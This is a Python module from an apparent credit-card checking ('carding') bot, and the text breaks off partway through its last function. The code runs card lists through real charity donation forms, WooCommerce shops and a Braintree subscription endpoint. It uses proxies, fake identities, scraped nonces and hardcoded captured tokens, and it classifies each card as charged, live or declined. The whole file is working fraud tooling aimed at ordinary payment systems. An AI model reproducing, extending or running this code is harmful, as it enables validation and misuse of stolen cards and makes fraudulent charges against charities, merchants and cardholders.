"""
extra_gates.py — Stripe $1 / $5 / Auth2 $0 / Braintree Auth3
Exports: check_st1, check_st5, check_stripe_auth, check_braintree_auth
"""
import asyncio, random, re, string, uuid, json as _json
import requests, aiohttp, urllib3
urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36")

def _proxy_dict(proxy):
    if not proxy:
        return None
    p = proxy.strip()
    if not p:
        return None
    if '://' not in p:
        if '@' in p:
            p = 'http://' + p
        else:
            parts = p.split(':')
            if len(parts) == 2:
                p = f'http://{parts[0]}:{parts[1]}'
            elif len(parts) == 4:
                p = f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
            else:
                p = 'http://' + p
    return {'http': p, 'https': p}

def _proxy_url(proxy):
    if not proxy:
        return None
    p = proxy.strip()
    if not p:
        return None
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    if '@' in p:
        return f'http://{p}'
    parts = p.split(':')
    if len(parts) == 2:
        return f'http://{p}'
    if len(parts) == 4:
        return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    return f'http://{p}'

# ══════════════════════════════════════════════════════════════
# STRIPE $1 — FormStack
# ══════════════════════════════════════════════════════════════
FORMSTACK_URL = 'https://sfapi.formstack.io/FormEngine/EngineFrame/CheckPayment'

def _sync_st1(card, proxy=None):
    try:
        cn, mm, yy, cvv = card.strip().split('|')
    except:
        return {'Status': 'Error', 'Response': 'Invalid card', 'Card': card}

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarylrxtO8wYB0rCO2sV',
        'Origin': 'https://formstack.io',
        'Referer': 'https://formstack.io/',
        'User-Agent': UA,
    }
    F = None
    files = [
        ('inputdate', (F, '11/3/2024 4:21:19')),
        ('userTimeZone', (F, '300')),
        ('txtHtmlId', (F, '2hbx1Fv8p-niFCJlWMSc5A')),
        ('txtSendSizeChange', (F, '')),
        ('txtObjId', (F, '')),
        ('txtOrgId', (F, 'St_LAnKxoEYM11rYjHBghR4LC0uJo-4KW5ABUsHvA54')),
        ('txtAuthToken', (F, '')),
        ('txtRefreshToken', (F, 'K0zpx8wxB38TXNrQVoMdHfRdIOC0XaH9ODN3-WwCDJG3qGlg2fZR8n4aFTRv1rENKoxcPKPuZUMiiW44yDjfo6YlzFFtKqw7BORu6686PmCPuIcpr8qYuYM4nD8KrkCn')),
        ('txtAccessURI', (F, '')),
        ('txtSessionID', (F, '7NCNQJHy9zzdPPN4Au831Mc7MO7cmTs2UzRJNvb1RKetD-H6B8uVZfauMca4LULJ')),
        ('txtSubmittedData', (F, '')),
        ('formHtml', (F, '')),
        ('multipageEnabled', (F, 'False')),
        ('breadcrumbEnabled', (F, 'False')),
        ('breadcrumbNumbered', (F, 'False')),
        ('breadcrumbPrefix', (F, '')),
        ('submitMessage', (F, 'Thank you for your submission!')),
        ('submitUrl', (F, '')),
        ('submitBtnText', (F, 'Submit ')),
        ('prevBtnText', (F, 'Back')),
        ('nextBtnText', (F, 'Next')),
        ('pageValType', (F, 'form')),
        ('txtUserContentId', (F, '')),
        ('hasCustomCSS', (F, 'True')),
        ('isCurrentForm', (F, 'False')),
        ('packageTier', (F, '')),
        ('isDraft', (F, 'False')),
        ('saveForLaterEnabled', (F, 'False')),
        ('saveBtnText', (F, 'Save')),
        ('discardBtnText', (F, 'Discard')),
        ('draftSaved', (F, '')),
        ('draftEmail', (F, '')),
        ('paymentType', (F, 'Stripe')),
        ('formName', (F, 'Donation Management Form')),
        ('formId', (F, '')),
        ('CommunityInstanceURL', (F, '')),
        ('CommunitySessioID', (F, '')),
        ('CommunityUserId', (F, '')),
        ('CommunityUserType', (F, '')),
        ('CommunityViewMode', (F, '')),
        ('comPrefillDataset', (F, '')),
        ('prefillDataset', (F, '')),
        ('comPrefillObj', (F, '')),
        ('hfFileServiceEndpoint', (F, 'https://sfapi.formstack.io')),
        ('hfFileServiceApiKey', (F, '8fc5982e-6eca-4d73-a3ff-997902b163b0-20212151122')),
        ('reCaptchaV3token', (F, '')),
        ('submissionWorkflowId', (F, '')),
        ('isPopulateHTMLFromBackEnd', (F, 'True')),
        ('hfIsNativePaymentOn', (F, 'False')),
        ('hfDefaultNativeSiteURL', (F, '')),
        ('hfPackageNamespace', (F, 'VisualAntidote__')),
        ('submitRules', (F, '')),
        ('FSGFRadioButton356', (F, 'Company%20Donation')),
        ('Contact.npsp__Primary_Affiliation__c.Name', (F, 'New%20yorm')),
        ('Contact.FirstName', (F, 'williams')),
        ('Contact.LastName', (F, 'hiro')),
        ('Contact.Email', (F, 'aa0799414021%40gmail.com')),
        ('Contact.HomePhone', (F, '5124578451')),
        ('Contact.npsp__Primary_Affiliation__c.Phone', (F, '5124578451')),
        ('Contact.Alumni__c', (F, 'No')),
        ('FSGFRadioButton346', (F, 'One-Time%20Donation')),
        ('FSGFDropdown701', (F, 'The%20School%20of%20Community%20Development%20and%20Public%20Services%20Education%20%28CDPSE%29')),
        ('Contact.Opportunity.A.Amount', (F, '1')),
        ('FSGFRadioButton436', (F, 'No')),
        ('Contact.Opportunity.A.Preferred_Name_on_Donaiton__c', (F, 'Williams')),
        ('Contact.Opportunity.A.Funding_Program__c', (F, 'a0u8V00000AT2h7QAD')),
        ('Contact.Opportunity.A.CloseDate', (F, '11%2F03%2F2024')),
        ('Contact.Opportunity.A.Name', (F, 'New%20yorm%20External%20Donation%2011%2F03%2F2024')),
        ('Contact.Opportunity.A.RecordTypeId', (F, '0128V000001iNcAQAU')),
        ('Contact.Opportunity.A.CampaignId', (F, '7018V000000sLgrQAE')),
        ('Contact.Opportunity.A.Method_of_Payment__c', (F, 'Credit%20Card')),
        ('Contact.Opportunity.A.StageName', (F, 'Closed%20Won')),
        ('Contact.Opportunity.A.Type_of_donation_company_individual__c', (F, 'Company%20Donation')),
        ('Contact.Opportunity.A.Remain_Anonymous__c', (F, 'No')),
        ('FSGFRadioButton831', (F, 'Yes')),
        ('FSGFShortAnswer6', (F, 'william%20Hiro')),
        ('FSGFShortAnswer776', (F, 'Hiro%20Hiroo')),
        ('Contact.npe01__AlternateEmail__c', (F, 'aa0799414021%40gmail.com')),
        ('Contact.AccountId.BillingStreet', (F, '123%20williams%20street%0Azh')),
        ('Contact.AccountId.BillingCity', (F, 'NY')),
        ('Contact.AccountId.BillingState', (F, 'New%20York')),
        ('Contact.AccountId.BillingPostalCode', (F, '10080')),
        ('Contact.AccountId.BillingCountry', (F, 'United%20States')),
        ('FFCreditCard14', (F, cn)),
        ('FFCVV14', (F, cvv)),
        ('FFExpiryMM14', (F, mm)),
        ('FFExpiryYYYY14', (F, yy)),
        ('Contact.AccountId.Name', (F, 'hiro%20Household')),
        ('Contact.AccountId.RecordTypeId', (F, '0128V000001iNc8QAE')),
        ('Contact.npsp__Primary_Affiliation__c.RecordTypeId', (F, '0128V000001iNc9QAE')),
        ('FSGFShortAnswer240', (F, '11%2F03%2F2024')),
        ('ReturnUrl', (F, 'https://formstack.io/D5036')),
    ]

    try:
        r = requests.post(FORMSTACK_URL, headers=headers, files=files,
                          proxies=_proxy_dict(proxy), timeout=25, verify=False)
    except requests.exceptions.Timeout:
        return {'Status': 'Error', 'Response': 'timeout', 'Card': card}
    except Exception as e:
        return {'Status': 'Error', 'Response': f'net: {str(e)[:60]}', 'Card': card}

    body = r.text.lower()
    if 'security code is incorrect' in body:
        return {'Status': 'Approved CCN ✅', 'Response': 'CVV mismatch — LIVE', 'Card': card}
    if 'your card could not be' in body:
        return {'Status': 'Approved ✅', 'Response': 'Live — prepaid restricted', 'Card': card}
    if 'declined' in body or 'card number is incorrect' in body or 'expiration' in body or 'sorry, we do not accept' in body:
        return {'Status': 'Declined ❌', 'Response': 'Declined', 'Card': card}
    if 'thank you' in body or 'success' in body:
        return {'Status': 'Charged ✅', 'Response': 'Stripe $1 charged', 'Card': card}
    return {'Status': 'Declined ❌', 'Response': 'Declined', 'Card': card}

async def check_st1(card, proxy=None):
    return await asyncio.to_thread(_sync_st1, card, proxy)

# ══════════════════════════════════════════════════════════════
# STRIPE $5 — GiveWP
# ══════════════════════════════════════════════════════════════
DONATE_URL = 'https://ourkidsatheart.com/donate-now-austin-chapter/'
FORM_URL   = 'https://ourkidsatheart.com/donate-now-austin-chapter/?payment-mode=stripe'

def _sync_st5(card, proxy=None):
    parts = card.strip().split('|')
    if len(parts) != 4:
        return {'Status': 'Error', 'Response': 'Invalid card', 'Card': card}
    number, month, year, cvv = parts
    if len(year) == 4:
        year = year[-2:]
    month = month.zfill(2)

    fnames = ['Ahmed', 'Mohamed', 'Sarah', 'Omar', 'Hannah', 'Yara', 'Khaled', 'Lina']
    lnames = ['Khalil', 'Smith', 'Williams', 'Garcia', 'Martinez', 'Brown']
    letters = ''.join(random.choices(string.ascii_lowercase, k=20))
    digits  = f'{random.randint(0, 9999):04d}'
    d = {'first': random.choice(fnames), 'last': random.choice(lnames),
         'email': f'{letters}{digits}@gmail.com'}

    s = requests.Session()
    s.verify = False
    s.headers.update({'User-Agent': UA})
    pd = _proxy_dict(proxy)
    if pd:
        s.proxies = pd

    try:
        r = s.get(DONATE_URL, timeout=20)
    except Exception as e:
        return {'Status': 'Error', 'Response': f'conn: {str(e)[:60]}', 'Card': card}
    html = r.text

    def grab(pat):
        m = re.search(pat, html)
        return m.group(1) if m else ''

    form_id   = grab(r'name="give-form-id" value="([^"]+)"')
    prefix    = grab(r'name="give-form-id-prefix" value="([^"]+)"')
    form_hash = grab(r'name="give-form-hash" value="([^"]+)"')
    register  = grab(r'name="give-form-user-register-hash" value="([^"]+)"')
    account   = grab(r'data-account="([^"]+)"')
    pk_live   = grab(r'data-publishable-key="([^"]+)"')
    spam_key  = grab(r'ZeroSpamDavidWalsh\s*=\s*\{[^}]*?"key"\s*:\s*"([^"]+)"')

    if not all([form_id, prefix, form_hash, register, account, pk_live]):
        return {'Status': 'Error', 'Response': 'token extraction failed', 'Card': card}

    guid = str(uuid.uuid4())
    pm_data = {
        'type': 'card',
        'billing_details[name]': f"{d['first']} {d['last']}",
        'billing_details[email]': d['email'],
        'billing_details[address][line1]': 'New york new states 1000',
        'billing_details[address][city]': 'New york',
        'billing_details[address][state]': 'NY',
        'billing_details[address][postal_code]': '10080',
        'billing_details[address][country]': 'US',
        'card[number]': number, 'card[cvc]': cvv,
        'card[exp_month]': month, 'card[exp_year]': year,
        'guid': guid, 'muid': guid, 'sid': guid,
        'payment_user_agent': 'stripe.js/148043f9d7; stripe-js-v3/148043f9d7; split-card-element',
        'referrer': 'https://ourkidsatheart.com',
        'time_on_page': '1303230',
        'key': pk_live,
        '_stripe_account': account,
    }
    try:
        r = s.post('https://api.stripe.com/v1/payment_methods', data=pm_data,
                   headers={'Accept': 'application/json',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Origin': 'https://js.stripe.com',
                            'Referer': 'https://js.stripe.com/'}, timeout=25)
        sj = r.json()
    except Exception as e:
        return {'Status': 'Error', 'Response': f'stripe: {str(e)[:60]}', 'Card': card}

    if 'id' not in sj:
        err = sj.get('error', {}).get('message', 'tokenization failed')
        return {'Status': 'Declined ❌', 'Response': f'stripe: {err[:60]}', 'Card': card}
    pm_id = sj['id']

    donation = {
        'give-honeypot': '',
        'give-form-id-prefix': prefix,
        'give-form-id': form_id,
        'give-form-title': 'Donate - Austin',
        'give-current-url': DONATE_URL,
        'give-form-url': DONATE_URL,
        'give-form-minimum': '5.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': form_hash,
        'give-price-id': 'custom',
        'give-recurring-logged-in-only': '',
        'give-logged-in-only': '1',
        '_give_is_donation_recurring': '0',
        'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
        'give-amount': '5.00',
        'give-recurring-period-donors-choice': 'day',
        'give_referral': d['first'],
        'give_stripe_payment_method': pm_id,
        'payment-mode': 'stripe',
        'give_first': d['first'],
        'give_last': d['last'],
        'give_email': d['email'],
        'give-form-user-register-hash': register,
        'give-purchase-var': 'needs-to-register',
        'card_name': d['first'],
        'billing_country': 'US',
        'card_address': 'New york new states 1000',
        'card_address_2': '',
        'card_city': 'New york',
        'card_state': 'NY',
        'card_zip': '10080',
        'give_action': 'purchase',
        'give-gateway': 'stripe',
        '71MzG': '',
        'zerospam_david_walsh_key': spam_key,
    }
    try:
        r = s.post(f'{FORM_URL}&form-id={form_id}', data=donation,
                   headers={'Accept': 'text/html',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Origin': 'https://ourkidsatheart.com',
                            'Referer': DONATE_URL}, timeout=25)
    except Exception as e:
        return {'Status': 'Error', 'Response': f'donation: {str(e)[:60]}', 'Card': card}

    body = r.text
    low  = body.lower()
    if 'thank you for your donation' in low or 'thank you' in low or 'successfully' in low:
        return {'Status': 'Charged ✅', 'Response': '$5 donation successful', 'Card': card}
    if 'requires_action' in low:
        return {'Status': 'Approved 3DS ✅', 'Response': '3DS required', 'Card': card}

    m = re.search(r'<strong>Error</strong>:\s*(.*?)</p>', body, re.S)
    if m:
        err = re.sub(r'<[^>]+>', '', m.group(1)).strip()[:150]
        el  = err.lower()
        if 'insufficient' in el:
            return {'Status': 'Approved CVV ✅', 'Response': f'insufficient — {err}', 'Card': card}
        if 'cvv' in el or 'security' in el:
            return {'Status': 'Approved CCN ❌', 'Response': f'CVV mismatch — {err}', 'Card': card}
        if 'address' in el or 'zip' in el:
            return {'Status': 'Approved AVS ❌', 'Response': f'AVS mismatch — {err}', 'Card': card}
        return {'Status': 'Declined ❌', 'Response': err, 'Card': card}

    return {'Status': 'Declined ❌', 'Response': 'Payment failed', 'Card': card}

async def check_st5(card, proxy=None):
    return await asyncio.to_thread(_sync_st5, card, proxy)

# ══════════════════════════════════════════════════════════════
# STRIPE AUTH2 $0
# ══════════════════════════════════════════════════════════════
AUTH_SITES = [
    'https://innercitytigers.com',
    'https://www.professionalmarine.eu',
    'https://www.domainegayda.com',
    'https://ecolution-hubs.co.uk',
    'https://shop.nemaneide.com',
]

NONCE_PATTERNS = [
    r'"createAndConfirmSetupIntentNonce"\s*:\s*"(.*?)"',
    r'"createSetupIntentNonce"\s*:\s*"(.*?)"',
    r'"ajax_nonce"\s*:\s*"([a-f0-9]+)"',
    r'wc_stripe_create_and_confirm_setup_intent_nonce[^v]+value="([^"]+)"',
    r'id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"',
    r'"_ajax_nonce"\s*:\s*"([a-f0-9]+)"',
    r'"nonce"\s*:\s*"([a-f0-9]+)"',
]
BAD_RESPONSES = {'', '0', 'null', 'false', '-1', 'undefined'}

def _is_bad_body(text):
    if text is None:
        return True
    return str(text).strip().lower() in BAD_RESPONSES

def _extract_error(text):
    for pat in [r'"decline_code"\s*:\s*"([^"]+)"',
                r'"message"\s*:\s*"([^"]+)"',
                r'"code"\s*:\s*"([^"]+)"']:
        m = re.search(pat, text)
        if m:
            return m.group(1).upper() if ('decline' in pat or 'code' in pat) else m.group(1)
    return ''

async def _auth_try_site(site_url, cc, mm, yy, cvv, proxy_url):
    site_domain = site_url.replace('https://', '').replace('http://', '').rstrip('/')
    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
    gu, mu, si = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
    headers_site = {'User-Agent': UA,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
    proxy_arg = _proxy_url(proxy_url)
    timeout = aiohttp.ClientTimeout(total=20, connect=8)
    jar = aiohttp.CookieJar(unsafe=True)
    card_fmt = f'{cc}|{mm}|{yy}|{cvv}'
    step = 'init'

    try:
        async with aiohttp.ClientSession(timeout=timeout, cookie_jar=jar) as session:
            step = 'pk'
            stripe_pk = None
            for url in [f'{site_url}/my-account/add-payment-method/',
                        f'{site_url}/my-account/',
                        f'{site_url}/checkout/', f'{site_url}/']:
                try:
                    async with session.get(url, headers=headers_site, ssl=False,
                                           allow_redirects=True, proxy=proxy_arg, timeout=12) as resp:
                        text = await resp.text()
                        for pat in [r'pk_live_[a-zA-Z0-9]{20,}',
                                    r'"publishableKey"\s*:\s*"(pk_live_[^"]+)"']:
                            m = re.search(pat, text)
                            if m:
                                stripe_pk = m.group(0) if pat.startswith(r'pk_live') else m.group(1)
                                break
                    if stripe_pk:
                        break
                except:
                    continue
            if not stripe_pk:
                return {'Status': 'Error', 'Response': 'no stripe pk', 'Card': card_fmt}

            step = 'register'
            reg_nonce = None
            for path in ['/my-account/', '/my-account-2/', '/register/']:
                try:
                    async with session.get(f'{site_url}{path}', headers=headers_site, ssl=False,
                                           allow_redirects=True, proxy=proxy_arg, timeout=12) as resp:
                        page_text = await resp.text()
                    for pattern in [
                        r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
                        r'id="woocommerce-register-nonce"[^>]*value="([^"]+)"',
                        r'(?:woocommerce-register-nonce|_wpnonce)[^v]+value="([^"]+)"',
                    ]:
                        m = re.search(pattern, page_text)
                        if m:
                            reg_nonce = m.group(1)
                            break
                    if reg_nonce:
                        break
                except:
                    continue
            if not reg_nonce:
                return {'Status': 'Error', 'Response': 'no reg nonce', 'Card': card_fmt}

            try:
                async with session.post(f'{site_url}/my-account/',
                                        data={'email': email,
                                              '_wp_http_referer': '/my-account/',
                                              'register': 'Register',
                                              'woocommerce-register-nonce': reg_nonce},
                                        headers={'User-Agent': UA,
                                                 'Content-Type': 'application/x-www-form-urlencoded',
                                                 'Origin': site_url,
                                                 'Referer': f'{site_url}/my-account/'},
                                        ssl=False, allow_redirects=True,
                                        proxy=proxy_arg, timeout=15) as resp:
                    await resp.text()
            except Exception as e:
                return {'Status': 'Error', 'Response': f'reg: {type(e).__name__}', 'Card': card_fmt}

            cookies = {c.key: c.value for c in jar}
            if not any('wordpress_logged_in' in k for k in cookies):
                return {'Status': 'Error', 'Response': 'reg failed (no cookie)', 'Card': card_fmt}

            step = 'nonce'
            nonce = None
            for path in ['/my-account/add-payment-method/',
                         '/my-account/payment-methods/',
                         '/checkout/', '/my-account/']:
                try:
                    async with session.get(f'{site_url}{path}', headers=headers_site, ssl=False,
                                           allow_redirects=True, proxy=proxy_arg, timeout=12) as resp:
                        page_text = await resp.text()
                    for pattern in NONCE_PATTERNS:
                        m = re.search(pattern, page_text)
                        if m:
                            nonce = m.group(1)
                            break
                    if nonce:
                        break
                except:
                    continue
            if not nonce:
                return {'Status': 'Error', 'Response': 'no setup nonce', 'Card': card_fmt}

            step = 'stripe_pm'
            stripe_headers = {'Accept': 'application/json',
                              'Content-Type': 'application/x-www-form-urlencoded',
                              'Origin': 'https://js.stripe.com',
                              'Referer': 'https://js.stripe.com/',
                              'User-Agent': UA}
            stripe_data = (
                f'type=card&card[number]={cc}&card[cvc]={cvv}'
                f'&card[exp_year]={yy}&card[exp_month]={mm}'
                f'&allow_redisplay=unspecified'
                f'&billing_details[address][postal_code]=10080'
                f'&billing_details[address][country]=US'
                f'&billing_details[name]=John%20Doe'
                f'&billing_details[email]={email}'
                f'&payment_user_agent=stripe.js%2F39de0b7336%3B+stripe-js-v3%2F39de0b7336%3B+payment-element%3B+deferred-intent'
                f'&referrer=https%3A%2F%2F{site_domain}'
                f'&time_on_page={random.randint(20000, 50000)}'
                f'&guid={gu}&muid={mu}&sid={si}&key={stripe_pk}'
                f'&_stripe_version=2024-06-20'
            )
            try:
                async with session.post('https://api.stripe.com/v1/payment_methods',
                                        data=stripe_data, headers=stripe_headers,
                                        ssl=False, proxy=proxy_arg, timeout=20) as resp:
                    stripe_text = await resp.text()
            except Exception as e:
                return {'Status': 'Error', 'Response': f'pm: {type(e).__name__}', 'Card': card_fmt}

            try:
                stripe_json = _json.loads(stripe_text)
            except:
                return {'Status': 'Error', 'Response': 'pm: bad json', 'Card': card_fmt}

            if 'error' in stripe_json:
                err = stripe_json['error']
                display = err.get('decline_code') or err.get('code') or err.get('message') or 'TOKENIZATION_FAILED'
                return {'Status': 'Declined ❌', 'Response': str(display)[:80], 'Card': card_fmt}

            pm_id = stripe_json.get('id', '')
            if not pm_id or not pm_id.startswith('pm_'):
                return {'Status': 'Error', 'Response': 'no pm_id', 'Card': card_fmt}

            step = 'confirm'
            confirm_headers = {'Accept': '*/*',
                               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                               'X-Requested-With': 'XMLHttpRequest',
                               'User-Agent': UA,
                               'Origin': site_url,
                               'Referer': f'{site_url}/my-account/add-payment-method/'}
            confirm_data = {'action': 'create_and_confirm_setup_intent',
                            'wc-stripe-payment-method': pm_id,
                            'wc-stripe-payment-type': 'card',
                            '_ajax_nonce': nonce}
            result_text = ''
            for ep_url, ep_params, ep_data in [
                (f'{site_url}/', {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}, confirm_data),
                (f'{site_url}/wp-admin/admin-ajax.php', {},
                 {**confirm_data, 'action': 'wc_stripe_create_and_confirm_setup_intent'}),
            ]:
                try:
                    async with session.post(ep_url, params=ep_params, headers=confirm_headers,
                                            data=ep_data, ssl=False,
                                            proxy=proxy_arg, timeout=20) as resp:
                        result_text = await resp.text()
                        if resp.status == 200 and not _is_bad_body(result_text):
                            break
                except:
                    continue
            if _is_bad_body(result_text):
                return {'Status': 'Error', 'Response': 'confirm: no body', 'Card': card_fmt}

            rl = result_text.lower()
            err_msg = _extract_error(result_text)
            if any(k in rl for k in ['"success":true', '"status":"succeeded"',
                                     'payment method added', 'payment_method_added']):
                if 'decline' in rl or 'card_declined' in rl:
                    return {'Status': 'Declined ❌', 'Response': err_msg or 'CARD_DECLINED', 'Card': card_fmt}
                return {'Status': 'Approved ✅', 'Response': 'Payment method added — LIVE', 'Card': card_fmt}
            if any(k in rl for k in ['requires_action', 'authentication_required',
                                     '3d_secure', 'redirect_to_url']):
                return {'Status': 'Approved 3DS ✅', 'Response': '3DS required', 'Card': card_fmt}
            if any(k in rl for k in ['incorrect_cvc', 'insufficient_funds',
                                     'invalid_cvc', 'cvc_check_failed']):
                return {'Status': 'Approved CCN ✅', 'Response': err_msg or 'CCN LIVE', 'Card': card_fmt}
            if any(k in rl for k in ['card_declined', 'generic_decline', 'do_not_honor',
                                     'fraudulent', 'lost_card', 'stolen_card',
                                     'pickup_card', 'restricted_card']):
                return {'Status': 'Declined ❌', 'Response': err_msg or 'CARD_DECLINED', 'Card': card_fmt}
            if 'expired_card' in rl or 'expired' in rl:
                return {'Status': 'Declined ❌', 'Response': 'EXPIRED_CARD', 'Card': card_fmt}
            if err_msg:
                return {'Status': 'Declined ❌', 'Response': err_msg, 'Card': card_fmt}
            return {'Status': 'Error', 'Response': 'confirm: unrecognized', 'Card': card_fmt}
    except asyncio.TimeoutError:
        return {'Status': 'Error', 'Response': f'{step}: timeout', 'Card': card_fmt}
    except Exception as e:
        return {'Status': 'Error', 'Response': f'{step}: {type(e).__name__}', 'Card': card_fmt}

async def check_stripe_auth(card, proxy=None):
    try:
        parts = card.strip().split('|')
        if len(parts) != 4:
            return {'Status': 'Error', 'Response': 'Invalid card format', 'Card': card}
        cc, mm, yy, cvv = [p.strip() for p in parts]
        if len(yy) == 2:
            yy = '20' + yy

        sites = list(AUTH_SITES)
        random.shuffle(sites)
        reasons = []

        for site_url in sites:
            try:
                r = await _auth_try_site(site_url, cc, mm, yy, cvv, proxy)
                if r and isinstance(r, dict):
                    if not ('Error' in r.get('Status', '') and 'no ' in r.get('Response', '')):
                        return r
                    reasons.append(f"{site_url.split('//')[1][:14]}:{r.get('Response', '')[:22]}")
            except Exception as e:
                reasons.append(f"{site_url.split('//')[1][:14]}:{type(e).__name__}")

        detail = ' | '.join(reasons[:3]) if reasons else 'no result'
        return {'Status': 'Error', 'Response': f'Auth: {detail}', 'Card': card}
    except Exception as e:
        return {'Status': 'Error', 'Response': f'exception: {str(e)[:60]}', 'Card': card}

# ══════════════════════════════════════════════════════════════
# BRAINTREE AUTH3 — FIXED version (no TypeError)
# ══════════════════════════════════════════════════════════════
_BT_BEARER = (
    'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0'
    '.eyJleHAiOjE2OTQ2MDUwNzAsImp0aSI6ImI1NGEyNWYyLWZjNTktNGI0Ni04ZjZkLTBmOTQwYWE3NjgyYyIsInN1YiI6InByOGtjMjZ0dGdzN21rc3kiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InByOGtjMjZ0dGdzN21rc3kiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ'
    '.PlfRyXAFroeBnqIc4DXOAW5r8Xk_XZOugdlpdEfmF_sEJU6JlCEauQvu0rZkCJaeb3DHZ19m25WICIJ9EUU5Tg'
)
_BT_JWT = (
    'JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9'
    '.eyJpZCI6IjY1MDA0ZDQxM2Y2N2Q2MzAyMzQzNDczMCIsImV4cCI6MTcyNTYyMjU5NDIxOH0'
    '.6gcjBwUEH9VhkjxDj11MDso3oecnDtDdFtKmd9QLy0E'
)
_BT_COOKIES = {
    '_ga': 'GA1.2.1808642279.1692732252',
    '_fbp': 'fb.1.1692732252369.193149443',
    '_gid': 'GA1.2.1634295707.1694517718',
}
_BT_GRAPHQL_QUERY = (
    'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   '
    'tokenizeCreditCard(input: $input) {     token     creditCard {       '
    'bin       brandCode       last4       cardholderName       expirationMonth      '
    'expirationYear      binData {         prepaid         healthcare         debit         '
    'durbinRegulated         commercial         payroll         issuingBank         '
    'countryOfIssuance         productId       }     }   } }'
)

def _sync_btauth(card, proxy=None):
    parts = card.strip().split('|')
    if len(parts) != 4:
        return {'Status': 'Error', 'Response': 'Invalid card format', 'Card': card}
    n, mm, yy, cvv = parts
    if len(yy) == 4:
        yy = yy[-2:]
    mm = mm.zfill(2)
    p = _proxy_dict(proxy)

    # ── Step 1: tokenize
    headers_1 = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'authorization': _BT_BEARER,
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': UA,
    }
    json_data_1 = {
        'clientSdkMetadata': {
            'source': 'client', 'integration': 'dropin2',
            'sessionId': '14b19c1b-3926-4aee-82e4-75f2b58fbe2a',
        },
        'query': _BT_GRAPHQL_QUERY,
        'variables': {
            'input': {
                'creditCard': {
                    'number': n, 'expirationMonth': mm, 'expirationYear': yy,
                },
                'options': {'validate': False},
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    try:
        r1 = requests.post('https://payments.braintree-api.com/graphql',
                           headers=headers_1, json=json_data_1,
                           proxies=p, timeout=25, verify=False)
        r1_text = (r1.text or '')[:200]
    except requests.exceptions.Timeout:
        return {'Status': 'Error', 'Response': 'tokenize: timeout', 'Card': card}
    except Exception as e:
        return {'Status': 'Error',
                'Response': f'tokenize: {type(e).__name__}: {str(e)[:60]}',
                'Card': card}

    # ── Robust parse (fixes TypeError)
    try:
        r1j = r1.json()
    except Exception:
        return {'Status': 'Error',
                'Response': f'tokenize: bad json [{r1_text[:80]}]',
                'Card': card}

    if not isinstance(r1j, dict):
        return {'Status': 'Error',
                'Response': f'tokenize: non-dict [{r1_text[:80]}]',
                'Card': card}

    if 'errors' in r1j:
        return {'Status': 'Error',
                'Response': f'tokenize: {str(r1j["errors"])[:100]}',
                'Card': card}

    data = r1j.get('data')
    if not isinstance(data, dict):
        return {'Status': 'Error',
                'Response': f'tokenize: no data [{r1_text[:80]}]',
                'Card': card}

    tcc = data.get('tokenizeCreditCard')
    if not isinstance(tcc, dict):
        return {'Status': 'Error',
                'Response': 'tokenize: missing tokenizeCreditCard',
                'Card': card}

    card_token = tcc.get('token')
    if not card_token:
        return {'Status': 'Error',
                'Response': 'tokenize: empty token',
                'Card': card}

    # ── Step 2: charge site
    headers_2 = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Authorization': _BT_JWT,
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://island.octalysisprime.com',
        'Referer': 'https://island.octalysisprime.com/',
        'User-Agent': UA,
    }
    json_data_2 = {'nonce': card_token, 'subscriptionPeriod': 'b'}

    try:
        r2 = requests.post(
            'https://island.octalysisprime.com/api/subscription/upgrade-account',
            cookies=_BT_COOKIES, headers=headers_2, json=json_data_2,
            proxies=p, timeout=25, verify=False,
        )
    except requests.exceptions.Timeout:
        return {'Status': 'Error', 'Response': 'charge: timeout', 'Card': card}
    except Exception as e:
        return {'Status': 'Error',
                'Response': f'charge: {type(e).__name__}: {str(e)[:60]}',
                'Card': card}

    if r2.status_code != 200:
        return {'Status': 'Declined ❌',
                'Response': f'charge HTTP {r2.status_code}',
                'Card': card}

    try:
        data = r2.json()
    except:
        data = {}

    status = data.get('status', 'Unknown') if isinstance(data, dict) else 'Unknown'
    body_low = (r2.text or '').lower()
    status_low = str(status).lower()

    if isinstance(data, dict):
        if data.get('success') is True:
            return {'Status': 'Approved ✅', 'Response': f'Approved — {status}', 'Card': card}
